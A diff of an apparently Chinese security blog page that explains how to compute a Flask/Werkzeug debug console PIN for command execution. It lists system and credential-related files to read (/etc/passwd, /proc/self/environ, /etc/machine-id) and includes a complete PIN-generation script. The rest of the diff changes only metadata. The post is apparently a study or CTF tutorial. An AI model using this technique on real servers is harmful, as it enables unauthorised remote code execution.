@@ -28,7 +28,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://i.loli.net/2021/04/12/TfxdY7Uq2Hurpvo.png">
 <meta property="article:published_time" content="2021-04-11T13:12:07.000Z">
-<meta property="article:modified_time" content="2024-09-08T03:56:24.000Z">
+<meta property="article:modified_time" content="2024-11-30T03:57:25.817Z">
 <meta property="article:author" content="My0n9s">
 <meta property="article:tag" content="python-pin">
 <meta name="twitter:card" content="summary">
@@ -129,18 +129,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">86</span>
+          <span class="site-state-item-count">89</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-count">13</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-count">23</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -203,7 +203,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2024-09-08 11:56:24" itemprop="dateModified" datetime="2024-09-08T11:56:24+08:00">2024-09-08</time>
+      <time title="Modified: 2024-11-30 11:57:25" itemprop="dateModified" datetime="2024-11-30T11:57:25+08:00">2024-11-30</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -234,7 +234,7 @@
 <p>但是每台环境下的pin码是固定的，如果我们能拿到pin码，就可以调用控制台，执行任意命令了。</p>
 <p>重点在于我们得知道6个参数：<code>username</code> 、<code>modname</code>、<code>getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</code> 、<code>getattr(mod, &#39;__file__&#39;, None)</code> 、<code>uuid.getnode()</code> 、<code> get_machine_id()</code>   </p>
 <p>关于每个参数的获得：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">username   为启动flask项目的用户，我们可以通过读 /etc/passwd 文件，读 /proc/self/environ 环境变量也行</span><br><span class="line">modname    一般情况下为flask.app</span><br><span class="line">getattr(mod,&#x27;__file__&#x27;,None)  为flask目录下 app.py 的绝对路径</span><br><span class="line">getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;)) 为Flask</span><br><span class="line">uuid.getnode()  为当前环境的mac地址，要转为10进制，一般可以通过读 /sys/class/net/eth0/address  </span><br><span class="line">get_machine_id() 读机器id ，在 docker 环境下我们读 /proc/self/cgroup,非docker环境下我们读 /etc/machine-id</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">username   为启动flask项目的用户，我们可以通过读 /etc/passwd 文件，读 /proc/self/environ 环境变量也行</span><br><span class="line">modname    一般情况下为flask.app</span><br><span class="line">getattr(mod,&#x27;__file__&#x27;,None)  为flask目录下 app.py 的绝对路径，通过报错可以获得。</span><br><span class="line">getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;)) 为Flask</span><br><span class="line">uuid.getnode()  为当前环境的mac地址，要转为10进制，一般可以通过读 /sys/class/net/eth0/address  </span><br><span class="line">get_machine_id() 读机器id ，在 docker 环境下我们读 /proc/self/cgroup,非docker环境下我们读 /etc/machine-id</span><br></pre></td></tr></table></figure>
 
 <p>然后利用网上一位大佬的脚本：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377866470&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;ed1616399be178a31fb6674be6f2ace57c452a153074871779d6d4a26a5211c1&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -307,7 +307,7 @@
 
   <div class="copyright">
     &copy; 
-    <span itemprop="copyrightYear">2024</span>
+    <span itemprop="copyrightYear">2025</span>
     <span class="with-love">
       <i class="fa fa-heart"></i>
     </span>
